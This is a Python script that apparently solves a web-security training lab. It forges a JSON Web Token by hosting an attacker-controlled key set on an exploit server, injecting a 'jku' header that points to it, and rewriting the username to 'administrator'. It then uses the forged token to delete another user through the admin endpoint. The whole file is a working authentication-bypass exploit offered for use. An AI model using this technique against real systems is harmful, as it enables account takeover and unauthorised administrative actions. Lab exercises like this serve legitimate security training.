import sys
import requests
import re
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.hazmat.primitives import hashes
import base64
import json


class Solver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'

    def get_csrf(self):
        response = requests.get(self.lab_url + 'login')
        return re.search('value="(.*)"', response.text).group(1)

    def get_jwt_token(self):
        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
        session = requests.Session()
        session.post(self.lab_url + 'login', data=data)
        return session.cookies['session']

    @staticmethod
    def generate_rsa_key_pair():
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return private_pem, public_pem

    @staticmethod
    def extract_n_and_e_from_public_key(public_key_pem):
        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
        n = public_key.public_numbers().n
        e = public_key.public_numbers().e
        return n, e

    @staticmethod
    def generate_jwk(n, e):
        n_b64 = base64.urlsafe_b64encode(n.to_bytes(n.bit_length() // 8 + 1, byteorder='big')).decode(
            'utf-8').rstrip('=')
        e_b64 = base64.urlsafe_b64encode(e.to_bytes(e.bit_length() // 8 + 1, byteorder='big')).decode(
            'utf-8').rstrip('=')
        return {'jwk': {
            'kty': 'RSA',
            'kid': '',
            'e': e_b64,
            'n': n_b64
        }}

    @staticmethod
    def sign(data, private_key_pem):
        private_key = load_pem_private_key(private_key_pem, password=None, backend=default_backend())
        signature = private_key.sign(
            data,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        return signature

    def upload_jku(self, jku):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK',
            'Content-Type': 'text/html; charset=utf-8',
            'responseBody': '{}'.format(json.dumps(jku)),
            'formAction': 'STORE'
        }
        requests.post(self.exploit_server_url, data=data)

    def generate_malicious_token(self):
        private_pem, public_pem = self.generate_rsa_key_pair()
        n, e = self.extract_n_and_e_from_public_key(public_pem)
        jwk = self.generate_jwk(n, e)
        token = self.get_jwt_token()
        header, payload, _ = token.split('.')
        header += '=' * (len(payload) % 4)
        header = base64.urlsafe_b64decode(header)
        json_header = json.loads(header.decode())
        jwk['jwk']['kid'] = json_header['kid']
        jku = {'keys': [jwk['jwk']]}
        self.upload_jku(jku)
        json_header['jku'] = self.exploit_server_url + 'exploit'
        header = json.dumps(json_header).encode()
        header = base64.urlsafe_b64encode(header).rstrip(b'=')
        payload += '=' * (len(payload) % 4)
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(b'wiener', b'administrator')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        data = header.decode() + '.' + payload.decode()
        signature = base64.urlsafe_b64encode(self.sign(data.encode(), private_pem)).rstrip(b'=')
        return header.decode() + '.' + payload.decode() + '.' + signature.decode()

    def delete_the_user(self):
        cookies = {'session': self.generate_malicious_token()}
        response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
        if 'wiener' in response.text and 'carlos' not in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
